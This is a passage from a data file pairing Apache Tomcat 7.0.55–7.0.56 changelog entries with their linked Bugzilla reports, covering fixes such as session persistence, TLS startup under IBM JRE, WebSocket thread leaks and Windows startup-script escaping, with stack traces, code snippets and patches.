	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:733)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:222)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1566)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1523)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:724)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57011
Catalina|Tomcat 7.0.56 (violetagg)|fix|57016|When using the PersistentValve do not remove sessions from the store when persisting them. (markt)|PersistentValve deletes sessions right after it creates them|"PersistentValve is broken as it stands and always delete sessions right after it creates them.  

cf. the following lines in https://github.com/apache/tomcat/blob/TOMCAT_7_0_42/java/org/apache/catalina/valves/PersistentValve.java#L178-L179

  store.save(session);
  ((PersistentManager) manager).removeSuper(session);


I have setup my PersistentManager with a JDBCStore, and if I set a breakpoint between these two lines, I can see the `save` call inserts a row into the database properly, and then take one step past the `removeSuper` call, and it deletes the row from the database.

The removeSuper (used by PersistentValve) method has the following comment on it:
""Remove this Session from the active Sessions for this Manager, but not from the Store.""

The implementation of remove in PersistentManagerBase has the following comment:
""Remove this Session from the active Sessions for this Manager, and from the Store.""

There is clearly a break in the API here. The PersistentValve is expecting the PersistentManager.removeSuper to do one thing (which method has a comment saying it exists only for the sake of PersistentValve, btw.), but PersistentManagerBase which implements this does a different thing than expected."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57016
Coyote|Tomcat 7.0.56 (violetagg)|fix|56780|Enable Tomcat to start when using SSL with an IBM JRE in strict SP800-131a mode. (markt)|"IBM Java: server.startup gives error ""java.lang.IllegalArgumentException: Only TLS1.2 protocol can be enabl ed in SP800_131 strict mode"""|"The problem is a change made in Tomcat 7.0.39. 

The offending code is in org.apache.tomcat.util.net.jsse.JSSESocketFactory.{...}:

        try {
            context = SSLContext.getInstance(""TLS"");
            ...

            SSLServerSocket socket = (SSLServerSocket) ssf.createServerSocket();
           ...
        } catch (NoSuchAlgorithmException e) {
            // Assume no RFC 5746 support
        } catch (KeyManagementException e) {
            // Assume no RFC 5746 support
        } catch (IOException e) {
            // Unable to determine default ciphers/protocols so use none
        }
        
With the IBM JVM configured for strict SP800-131a mode, the ssf.createServerSocket() will throw an IllegalArgumentException, which is a very bad thing to have happen in a class initializer.

IBM JRE: 6.0 (SR16) : Email me direct for the JRE if you want to test it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56780
Coyote|Tomcat 7.0.56 (violetagg)|fix|56910|Prevent the invalid value of -1 being used for maxConnections with APR connectors. (markt)|"when maxConnections=""-1"" AprEndpoint init error"|"use apr connector
set maxConnections=""-1"" in server.xml

when start tomcat, exceptions occur:

java.lang.NegativeArraySizeException
	at org.apache.tomcat.util.net.AprEndpoint$SocketTimeouts.<init>(AprEndpoint.java:1145)
	at org.apache.tomcat.util.net.AprEndpoint$Poller.init(AprEndpoint.java:1382)
	at org.apache.tomcat.util.net.AprEndpoint.startInternal(AprEndpoint.java:602)
	at org.apache.tomcat.util.net.AbstractEndpoint.start(AbstractEndpoint.java:650)
	at org.apache.coyote.AbstractProtocol.start(AbstractProtocol.java:449)
	at org.apache.catalina.connector.Connector.startInternal(Connector.java:1007)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:459)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:731)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:689)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:321)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:455)

In AprEndpoint.init() methodÔºö

        protected void init() {

            pool = Pool.create(serverSockPool);

            // Single poller by default
            int defaultPollerSize = getMaxConnections();

            if ((OS.IS_WIN32 || OS.IS_WIN64) && (defaultPollerSize > 1024)) {
                // The maximum per poller to get reasonable performance is 1024
                // Adjust poller size so that it won't reach the limit. This is
                // a limitation of XP / Server 2003 that has been fixed in
                // Vista / Server 2008 onwards.
                actualPollerSize = 1024;
            } else {
                actualPollerSize = defaultPollerSize;
            }

            timeouts = new SocketTimeouts(defaultPollerSize); //here !!!

did not check getMaxConnections() maybe return -1."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56910
Coyote|Tomcat 7.0.56 (violetagg)|fix||Ensure that AjpNioProtocol and AjpAprProtocol enable the KeepAliveTimeout. (kfujino)|||
Jasper|Tomcat 7.0.56 (violetagg)|fix|43001|Enable the JspC Ant task to set the JspC option mappedFile. (kkolinko)|JspC lacks setMappedFile and setDie for use in Ant task|"The output files of the task (which defaults to false) will differ vs. what is 
generated at runtime with the web.xml 'mappedfile' parameter set true.  I just 
did a quick check and 'die' seemed to be the only other option that was 
missing that might make sense in the task.  These also occur in all versions 
of Tomcat and might be ported to 5.x."|https://bz.apache.org/bugzilla/show_bug.cgi?id=43001
Jasper|Tomcat 7.0.56 (violetagg)|fix|56797|When matching a method in an EL expression, do not treat bridge methods as duplicates of the method they bridge to. In this case always call the target of the bridge method. (markt)|EL-API does not find overriden method|"Util.findWrapper(..) returns with a MethodNotFoundException (util.method.ambiguous) under the following conditions:
- A method is overriden and the return type in the overriden method is inherited from the original method's return type
- The method is called with a parameter whose type is inherited from the declared type (assignable)

Apparently, this leads to a situation with multiple matches.
If only one of those conditions is true, the error does not occur.

Example:
--------
	
TesterBeanA.java:

    public CharSequence getCharSequence(CharSequence cs) {
        return cs;
    }
	
TesterBeanAA.java

    @Override
    public String getCharSequence(CharSequence cs) {
        return cs.toString();
    }

Test Case:
----------

TestMethodExpressionImpl.java:

    @Test
    public void testInvokeOverridenParamAndReturnType() {
        MethodExpression me = factory.createMethodExpression(context,
                ""${beanAA.getCharSequence('test')}"", null ,
                new Class<?>[] { TesterBeanB.class });
        assertEquals(""test"", me.invoke(context, null));
    }

Note 1: The error also occurs if getCharSequence(..) in TesterBeanA is abstract.
I suggest adding a check for isAbstract() upon reading method modifiers and drop abstract method right away.

Note 2: This worked in Tomcat 7.0.40."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56797
Jasper|Tomcat 7.0.56 (violetagg)|fix||Correct a logic error in the JasperElResolver. There was no functional impact but the code was less efficient as a result of the error. Based on a patch by martinschaef. (markt)|||
Jasper|Tomcat 7.0.56 (violetagg)|fix||Ensure that the implementation of javax.servlet.jsp.PageContext.include(String) and javax.servlet.jsp.PageContext.include(String, boolean) will throw IOException when an I/O error occur during the operation. (violetagg)|||
Jasper|Tomcat 7.0.56 (violetagg)|fix|56908|Fix some potential resource leaks when reading jar files. Reported by Coverity Scan. Based on patch provided by Felix Schumacher. (violetagg)|Resource Leaks found by CID 45133|"Created attachment 31961 [details]
Add try-with block to prevent leakage of jar-resource

Prevent resource leak identified by Coverity Scan ID 45133 by adding a try-with block."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56908
Jasper|Tomcat 7.0.56 (violetagg)|fix|56991|Deprecate the use of a request attribute to pass a <jsp-file> declaration to Jasper and prevent an infinite loop if this technique is used in conjunction with an include. (markt)|Request attribute org.apache.catalina.jsp_file needs to be nulled out after single use|"See JspServlet lines 302-304:

   // JSP specified via <jsp-file> in <servlet> declaration and supplied through
   //custom servlet container code
   jspUri = (String) request.getAttribute(Constants.JSP_FILE);


The comment here implies that the container uses this method to identify a servlet that is declared with a jsp-file attribute. However, tomcat actually uses the init-param ""jspFile"" on a copy of the JspServlet with the name of the target jsp instead.

If a container sets this attribute as per the comment, it can cause stack overflow when jsp including is used:

 a.jsp is defined in a jsp-file on a servlet in web.xml
 a.jsp includes b.jsp

When a.jsp is serviced it does an include dispatch to b.jsp. When the JspServlet is called for b.jsp, it sees that the request attribute with a.jsp is set, so processes it again ... which does an include dispatch for b.jsp ... which causes a.jsp to be processed again .... and then rinse and repeat.

Note that Glassfish nulls out this attribute after it has been detected:

  if (jspFile != null) {
            // JSP is specified via <jsp-file> in <servlet> declaration
            jspUri = jspFile;
            request.removeAttribute(Constants.JSP_FILE);
        } else {

Jan"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56991
Jasper|Tomcat 7.0.56 (violetagg)|fix||Fix a potential resource leak in JDTCompiler when checking whether a resource is a package. Reported by Coverity Scan. (fschumacher)|||
WebSocket|Tomcat 7.0.56 (violetagg)|code|56446|Clearer handling of exceptions when calling a method on a POJO based WebSocket endpoint. Based on a suggestion by Eugene Chung. (markt)|Handling InvocationTargetException for PojoMessageHandlerWholeBase and PojoMessageHandlerPartialBase.onMessage()|"Both two methods handle InvocationTargetException from Endpoint @OnMessage method like this:

        try {
            result = method.invoke(pojo, parameters);
        } catch (IllegalAccessException | InvocationTargetException e) {
            throw new IllegalArgumentException(e);
        }

I'd like to suggest to use

org.apache.tomcat.util.ExceptionUtils#unwrapInvocationTargetException() and RuntimeException

, which is like below:

        try {
            result = method.invoke(pojo, parameters);
        } catch (IllegalAccessException | InvocationTargetException e) {
            Throwable throwable = ExceptionUtils.unwrapInvocationTargetException(e);
            if (throwable instanceof RuntimeException) {
                throw (RuntimeException) throwable;
            } else {
                throw new RuntimeException(throwable);
            }
        }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56446
WebSocket|Tomcat 7.0.56 (violetagg)|fix|56746|Allow secure WebSocket client threads to use the current context class loader rather than explicitly setting it to the class loader that loaded the WebSocket implementation. This allows WebSocket client connections from within web applications to access, amongst other things, the JNDI resources associated with the web application. (markt)|Webssocket secure client thread cannot access webapp resources|"The new SecureIOThreadFactory method in org.apache.tomcat.websocket.AsyncChannelWrapperSecure
 sets the context class loader of the secure websocket client threads to it's own standard class loader - thus preventing the them from accessing webapp resources.

Removing this line restores access, as the new threads then have the classloader of the calling (webapp) thread"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56746
WebSocket|Tomcat 7.0.56 (violetagg)|fix|56905|Make destruction on web application stop of thread group used for WebSocket connections more robust. (kkolinko/markt)|"""Unable to destroy WebSocket thread group"" warning when reloading examples webapp"|"Testing 8.0.12 release candidate.
Windows, JDK 7u67 (32-bit), NIO connector.

Steps to reproduce:
==========
1. Start Tomcat

2. Visit ""Echo"" websockets example and do the following
http://localhost:8080/examples/websocket/echo.xhtml
- Select any connection option
(I like ""(*) annotation API (stream)"", but the issue is reproducible with any of the 3 connection options)
- Press ""Connect"" button
- Press ""Echo message"" button
- Press ""Disconnect"" button

3. Touch file webapps\examples\WEB-INF\web.xml and wait for the web application to be reloaded by Tomcat

Actual: Webapp reloading completes successfully, but a ""Unable to destroy WebSocket thread group"" warning is logged into logs/catalina.2014-08-31.log file:
Expected: No warning.

[[[
31-Aug-2014 18:20:22.357 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.core.StandardContext.reload Reloading Context with name [/examples] has started
31-Aug-2014 18:20:22.362 WARNING [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.tomcat.websocket.server.WsServerContainer.destroy Unable to destroy WebSocket thread group [WebSocketServer-localhost-/examples] as some threads were still running when the web application was stopped
31-Aug-2014 18:20:22.877 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.core.StandardContext.reload Reloading Context with name [/examples] is completed
]]]

Evaluation, notes
==========
1) Reproduction rate is less than 100%. Sometimes the warning does not happen. Steps 2-4 can be repeated without restarting Tomcat until the issue shows itself.
In the example, any connection option can be used. The issue does not depend on it.

2) The message is printed by org.apache.tomcat.websocket.server.WsServerContainer.destroy() method and originates from r1589043

3) I tried to get more information, by adding the following debug code:
[[[
            StringBuilder buf = new StringBuilder();
            buf.append(threadGroup.getName());
            buf.append("" activeCount: "").append(threadGroup.activeCount());
            buf.append("" isDestroyed: "").append(threadGroup.isDestroyed());
            Thread[] threads = new Thread[100];
            int threadCount = threadGroup.enumerate(threads, false);
            buf.append(""\nactual Thread count: "").append(threadCount);
            for (int i=0; i<threadCount; i++) {
                buf.append(""\n\n"").append(threads[i]);
                StackTraceElement[] stack = threads[i].getStackTrace();
                for (StackTraceElement ste: stack) {
                    buf.append(""\n\t"").append(ste);
                }
            }
            log.warn(buf.toString());
]]]

The results:
1. activeCount: 0 isDestroyed: false
2. actual Thread count: 0, threadGroup.enumerate() have not returned any thread.
3. If I add second threadGroup.destroy(); call after the above code, it succeeds.

4) There are no PermGen memory leaks. (No thread stack traces are printed by WebappClassLoader leak detection code. No leaks detected by Find leaks command in Tomcat Manager webapp).

Missing a ThreadGroup.destroy() call will keep this thread group in its parent thread group's list, so there will be a small java object leak.

5) In this case we were safe, but generally there might be threads that are still running, as they perform some web application code.
So the warning is justified.

Thoughts on a possible fix
==========
1) Use threadGroup.setDaemon(true) [1].

The daemon flag on a thread group means that its destroy() method will be called automatically when its thread count reaches zero.

Generally it either shall be done in a synchronized(threadGroup) block, or we shall call some synchronized methods later to make sure that the change is propagated. (E.g. calling ThreadGroup.isDestroyed(), ThreadGroup.activeCount() is good for this).

The goal is to avoid the java object leak.

[1] http://docs.oracle.com/javase/7/docs/api/java/lang/ThreadGroup.html#setDaemon%28boolean%29

2) Ask for threadGroup.activeCount() and include the count in the warning message."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56905
WebSocket|Tomcat 7.0.56 (violetagg)|fix|56907|Ensure that client IO threads are stopped if a secure WebSocket client connection fails. (markt)|Threads leak|"Hello.

While using WebSocket implementation of versions 7.0.55 and 8.0.11 leaking threads were noticed. 
Use method WsWebSocketContainer.connection (endpoint, clientEndpointConfiguration, path) to reproduce this issue. 
The URL to specify a non-existent page. As a result, the connection will return an error ""404 Not Found"", but the threads that have been created in the class AsyncChannelWrapperSecure will stay alive for a long time (source of threads creation: private final ExecutorService executor = Executors.newFixedThreadPool (2, new SecureIOThreadFactory ());). 
Count of threads are increasing with every reconnect attempt to non-existent URL.
Those will live for a very long time, until you disable the application that calls the connection WsWebSocketContainer.connection (...). 
Leakage threads can be observed using the jvisualvm program. 

Please, make it possible to deal with such kind of situations and destroy unused threads."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56907
WebSocket|Tomcat 7.0.56 (violetagg)|fix||When a WebSocket client attempts to write to a closed connection, handle the resulting IllegalStateException in a manner consistent with the handling of an IOException. (markt)|||
WebSocket|Tomcat 7.0.56 (violetagg)|add||Add support for the permessage-deflate extension. This is currently limited to decompressing incoming messages on the server side. It is expected that support will be extended to outgoing messages and to the client side shortly. (markt)|||
WebSocket|Tomcat 7.0.56 (violetagg)|add||Extend support for the permessage-deflate extension to compression of outgoing messages on the server side. (markt)|||
WebSocket|Tomcat 7.0.56 (violetagg)|fix|56982|Return the actual negotiated extensions rather than an empty list for Session.getNegotiatedExtensions(). (markt)|Websocket session.getNegotiatedExtensions() always return an empty list whereas permessage-deflate enabled|"whereas permessage-deflate is enabled, WsSession.getNegotiatedExtensions() always return an empty list.
If I use a  ServerEndpointConfig.Configurator, I see that the ServerEndpointConfig return a list with the ""permessage-deflate"" extension.

but in WsSession.java the current code is

    public List<Extension> getNegotiatedExtensions() {
        checkState();
        return Collections.emptyList();
    }


regards"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56982
WebSocket|Tomcat 7.0.56 (violetagg)|update||Update the WebSocket implementation to support the Java WebSocket specification version 1.1. (markt)|||
Web applications|Tomcat 7.0.56 (violetagg)|fix||Correct the label in the list of sessions by idle time for the bin that represents the idle time immediately below the maximum permitted idle time when using the expire command of the Manager application. (markt)|||
Web applications|Tomcat 7.0.56 (violetagg)|update||Update the Windows authentication documentation after some additional testing to answer the remaining questions. (markt)|||
Web applications|Tomcat 7.0.56 (violetagg)|fix||Correct a couple of broken links in the Javadoc. (markt)|||
Other|Tomcat 7.0.56 (violetagg)|add|56788|Display the full version in the list of installed applications when installed via the Windows installer package. Patch provided by Alexandre Garnier. (markt)|Set Version information in uninstaller on Windows|"There are no version information for Tomcat when listing softwares in Windows.
Cf. attached screenshot to understand."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56788
Other|Tomcat 7.0.56 (violetagg)|add|56829|Add the ability for users to define their own values for _RUNJAVA and _RUNJDB environment variables. Be more strict with executable filename on Windows (s/java/java.exe/). Based on a patch by Neeme Praks. (markt/kkolinko)|do not override _RUNJAVA and _RUNJDB environment variables if already defined|"Created attachment 31888 [details]
patch

I'm integrating LiveRebel (http://liverebel.com) with Tomcat. I need a clean way how to get Tomcat scripts to start LiveRebel agent instead of Tomcat (the agent will be responsible for starting Tomcat).

Currently we are patching Tomcat scripts (catalina.sh/bat and setclasspath.sh/bat); however, that is messy, as every time user updates Tomcat, those changes get overwritten.

Instead, I would like to change the ""java"" executable that Tomcat scripts use to start Tomcat.

My current solution is to set _RUNJAVA environment variable in CATALINA_BASE/bin/setenv.sh/bat and then patch CATALINA_HOME/bin/setclasspath.sh/bat not to override the setting if already set (see the attached patch).
This solution is also described here:
http://zeroturnaround.com/forums/topic/trouble-setting-up-live-rebel-with-tomcat-on-ubuntu/#post-45253"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56829
Other|Tomcat 7.0.56 (violetagg)|fix|56895|Correctly compose JAVA_OPTS in catalina.bat so that escape sequences are preserved. Patch by Lucas Theisen. (markt)|catalina.bat does not properly compose JAVA_OPTS|"When composing JAVA_OPTS, the current bat script uses this approach:

set JAVA_OPTS=%JAVA_OPTS% %OTHER_STUFF%

However, this leads to issues if the existing JAVA_OPTS had some sort of escape sequence in it.  For example, in my setenv.bat, I add some proxy info:

SET ""JAVA_OPTS=-Dhttp.proxyHost=myproxy.localdomain -Dhttp.nonProxyHosts=*.localdomain^|localhost^|appserver.localdomain""

Using the existing approach, the escape sequence ^| gets processed into | leaving the next evaluation to treat it as a command pipe, which causes immediate failure.

If instead you use this approach:

set ""JAVA_OPTS=%JAVA_OPTS% %OTHER_STUFF%""

Then those escape sequences are preserved.  Here is the patch for version 7.0.54:

--- catalina.bat_ORIGINAL       2014-08-27 18:37:05.173641700 -0400
+++ catalina.bat        2014-08-27 18:06:22.779721000 -0400
@@ -176,12 +176,12 @@
 if not exist ""%CATALINA_BASE%\conf\logging.properties"" goto noJuliConfig
 set LOGGING_CONFIG=-Djava.util.logging.config.file=""%CATALINA_BASE%\conf\logging.properties""
 :noJuliConfig
-set JAVA_OPTS=%JAVA_OPTS% %LOGGING_CONFIG%
+set ""JAVA_OPTS=%JAVA_OPTS% %LOGGING_CONFIG%""

 if not ""%LOGGING_MANAGER%"" == """" goto noJuliManager
 set LOGGING_MANAGER=-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
 :noJuliManager
-set JAVA_OPTS=%JAVA_OPTS% %LOGGING_MANAGER%
+set ""JAVA_OPTS=%JAVA_OPTS% %LOGGING_MANAGER%""

 rem ----- Execute The Requested Command ---------------------------------------"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56895
Other|Tomcat 7.0.56 (violetagg)|update|56988|Allow to use relative path in base.path setting when building Tomcat. (kkolinko)|"Allow to use relative paths in base.path setting when building Tomcat, e.g. ""base.path=../libraries"""|"Someone has configured ASF Buildbot for Tomcat with
'echo base.path=../basepath > build.properties'

It resulted in failure at step ""extras-commons-logging"",
http://ci.apache.org/builders/tomcat-7-trunk/builds/296

Some log file snippets:

[[[
testexist:
     [echo] Testing  for ../basepath/avalon-framework-4.1.5/avalon-framework-4.1.5.jar

downloadfile:

]]]

[[[
extras-commons-logging:
   [gunzip] Expanding /home/buildslave32/slave32/tomcat-7-trunk/basepath/commons-logging-1.1.3/commons-logging-1.1.3-src.tar.gz to /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-src.tar
    [untar] Expanding: /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-src.tar into /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging
    [mkdir] Created dir: /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/src/main/java/org/apache/juli
     [move] Moving 16 files to /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/src/main/java/org/apache/juli
     [copy] Copying 1 file to /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src
     [copy] Copying 4 files to /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src

init:
     [echo] -------- Logging Wrapper Library 1.1.3 --------

prepare:
     [echo] 
     [echo]     Log4j12: log4j-1.2.17.jar
     [echo]     
     [echo]     
     [echo]     LogKit: ../basepath/logkit-1.0.1/logkit-1.0.1.jar
     [echo]     Avalon-Framework: ../basepath/avalon-framework-4.1.5/avalon-framework-4.1.5.jar
     [echo]     
    [mkdir] Created dir: /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/target
    [mkdir] Created dir: /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/target/classes
    [mkdir] Created dir: /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/target/conf
    [mkdir] Created dir: /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/target/tests

static:
     [copy] Copying 1 file to /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/target/conf

discovery:

log4j12-warning:

log4j13-warning:

logkit-warning:
     [echo] 
     [echo]     *** WARNING ***
     [echo]     LogKit not found: Cannot Build LogKitLogger
     [echo]     

jdk1.4-warning:

avalon-framework-warning:
     [echo] 
     [echo]     *** WARNING ***
     [echo]     Avalon-Framework not found: Cannot Build AvalonLogger
     [echo]     

compile-non-log4j:
    [javac] /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/build2.xml:362: warning: 'includeantruntime' was not set, defaulting to build.sysclasspath=last; set to false for repeatable builds
    [javac] Compiling 11 source files to /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/target/classes
    [javac] /home/buildslave32/slave32/tomcat-7-trunk/build/output/extras/logging/commons-logging-1.1.3-src/src/main/java/org/apache/juli/logging/impl/ServletContextCleaner.java:23: package javax.servlet does not exist
    [javac] import javax.servlet.ServletContextEvent;
    [javac]                     ^
]]]

So,
1. avalon-framework-4.1.5.jar was present and has not been downloaded
2. commons-logging build script failed to detect it,
with ""Avalon-Framework not found: Cannot Build AvalonLogger""

Compilation is performed by 

    <ant antfile=""${tomcat.extras}/logging/commons-logging-${commons-logging.version}-src/build2.xml""
         dir=""${tomcat.extras}/logging/commons-logging-${commons-logging.version}-src""
         target=""compile"" />

So dir is a different directory.


Fix
====
I was able to fix this issue by adding inheritAll=""false"" to the above <ant> command."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56988
Other|Tomcat 7.0.56 (violetagg)|fix|56990|Ensure that the ide-eclipse build target downloads all the libraries required by the default Eclipse configuration files and configures Eclipse to use Java 6 for the project. Add build target ide-eclipse-websocket that creates a separate linked project that compiles websocket classes of Tomcat 7 with Java 7 compiler. (kkolinko)|ant ide-eclipse target shall download easymock library|"When configuring Eclipse project for Tomcat 8 via ""ant ide-eclipse"" command, as documented at [1], it does not download easymock library. The library is referenced in res/ide-support/eclipse/eclipse.classpath file.

[1] http://tomcat.apache.org/tomcat-8.0-doc/building.html

This issue was originally reported via documentation comments system at [1].

The ""ide-eclipse"" target downloads libraries used by build and by extras, but it does not download libraries used by test target."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56990
Catalina|Tomcat 7.0.55 (violetagg)|fix|44312|Log an error if there is a conflict between Host and Alias names. Improve host management methods in Mapper to avoid occasionally removing a wrong host. Check that host management operations are performed on the host and not on an alias. (kkolinko)|Warn when overwritting docBase of the default Host, with docBase of an alias with the same name..|"On a system running tomcat 6.0.14 we encountered the problem, that the specified
docBase of the default Host of an Engine is being overwritten, when an Alias
with the same name (as the default Host) is defined on a different Host of the
same Engine.

The user should be warned if the docBase of the default Host is being changed to
the one of an Alias.

When using tomcat 6.0.13 this problem didn't occur; means that the docBase of
the default Host remained the same for an equal configuration.

Are there any future plans on providing such a warning?

Best regards, Jan"|https://bz.apache.org/bugzilla/show_bug.cgi?id=44312
Catalina|Tomcat 7.0.55 (violetagg)|fix|55282|Ensure that one and the same application listener is added only once when starting the web application. (violetagg)|JSF PhaseListeners are duplicated|"Created attachment 30604 [details]
source code to reproduce the issue

If using jsf 2 project and add Phase Listeners there, they are created and added to the list of Phase Listeners twice which means on page load same Phase Listeners are executed twice.
This is happening only when com.sun.faces.config.ConfigureListener is defined in web.xml.
Without such declaration in web.xml jsf is initialized one time.
Such behaviour seems to happen on 7.0.42 version.
I was using 7.0.41 and didn't see such behaviour. I didn't have a chance to check it again on 7.0.41 but checked on 7.0.6(because had it installed) and there everything was fine.
Such behaviour can be very critical for applications using jsf and Phase Listeners. And Maybe not only Phase Listeners are duplicated(didn't look), because the problem here is that jsf is initialized twice and other things can get duplicated too.
Attaching eclipse project where you can check the bug on 7.0.42 and compare to other tomcat version. In 7.0.42 there is duplicated message in console that Phase Listener is created."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55282
Catalina|Tomcat 7.0.55 (violetagg)|add|56461|New failCtxIfServletStartFails attribute on Context and Host configuration to force the context startup to fail if a load-on-startup servlet fails its startup. (slaurent)|New option to make context startup fail if a load-on-startup servlet fails|"Created attachment 31563 [details]
Patch for tomcat 8

Currently when a servlet with load-on-startup >=0 fails its startup, the context startup is still considered as OK.
With some webapps (like spring-based ones with a DispatcherServlet), this makes no sense at all : if the servlet failed its startup, the webapp is unuseable and it would be more sensible to have tomcat mark the context as failed.

Such a behavior is not specified in JEE specs, so I propose to have a new optional flag on Context and Host containers.

In the attached patch, the flag is named failDeploymentIfServletLoadedOnStartupFails . If specified on Context, it overrides the value potentially specified at the Host level.

The proposed patch for tomcat 8 passes checkstyle, provides a unit test and updates documentation.
If it's OK with the patch, I'd also like to have it backported to tomcat 7."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56461
Catalina|Tomcat 7.0.55 (violetagg)|add|56526|Improved the StuckThreadDetectionValve to optionally interrupt stuck threads to attempt to unblock them. (slaurent)|New option to interrupt stuck threads|"The StuckThreadDetectionValve is able to detect stuck threads.
It can be improved to also interrupt such threads to try and unblock them in case they are just stuck in I/O or network calls.

This would be more or less similar to apache httpd TimeOut directive or PHP max_execution_time (http://www.php.net/manual/en/info.configuration.php#ini.max-execution-time ) and would protect the tomcat server from slow or non-responding backend services and unproperly configured timeouts in the application."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56526
Catalina|Tomcat 7.0.55 (violetagg)|fix|56545|Pre-load an additional class, the loading of which may otherwise be triggered by a web application which in turn would trigger an exception when running under a security manager. (kkolinko)|Examples app security exceptions|"Created attachment 31637 [details]
(1) localhost.2014-05-20.log

Testing examples web application in 8.0.8 release candidate running with Security Manager enabled, with NIO connector, JDK 7u55 32-bit, Win7, I see several issues.

Steps to reproduce (1).

1. Edit conf/tomcat-users.xml  and uncomment sample roles there.
2. Start bin/catalina.bat start -security

3. Access the following page:
http://localhost:8080/examples/jsp/security/protected/index.jsp

Expected: Login page
Actual: Error 500
Access denied (""java.lang.RuntimePermission"" ""accessClassInPackage.org.apache.tomcat.util.http.parser"")

The stack trace is:

 java.security.AccessControlException: access denied (""java.lang.RuntimePermission"" ""accessClassInPackage.org.apache.tomcat.util.http.parser"")
at java.security.AccessControlContext.checkPermission(AccessControlContext.java:372)
at java.security.AccessController.checkPermission(AccessController.java:559)
at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1525)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:305)
at java.lang.ClassLoader.loadClass(ClassLoader.java:412)
at java.lang.ClassLoader.loadClass(ClassLoader.java:358)
at org.apache.tomcat.util.http.parser.HttpParser.skipConstant(HttpParser.java:305)
at org.apache.tomcat.util.http.parser.HttpParser.parseMediaType(HttpParser.java:192)
at org.apache.tomcat.util.http.parser.MediaTypeCache.parse(MediaTypeCache.java:54)
at org.apache.catalina.connector.Response.setContentType(Response.java:712)
at org.apache.jsp.jsp.security.protected_.login_jsp._jspService(login_jsp.java:52)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:725)

See attached ""(1) localhost.2014-05-20.log"" for the full stack trace."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56545
Catalina|Tomcat 7.0.55 (violetagg)|fix|56578|Correct regression in the fix for 56339 that prevented sessions from expiring when using clustering. (markt)|session.invalidate does not work on cluster enabled webapps|"session invalidate does not work in 7.0.54 when Tomcat is clustered. 7.0.53 is OK.

Steps to reproduce:

1. Use Clustered Tomcat, with the following added to the <Host/> in server.xml:

<Cluster className=""org.apache.catalina.ha.tcp.SimpleTcpCluster""/>

2. Drop session.jsp and invalidate.jsp from attachments into a directory.

3. Open session.jsp in a browser. Note creation time.

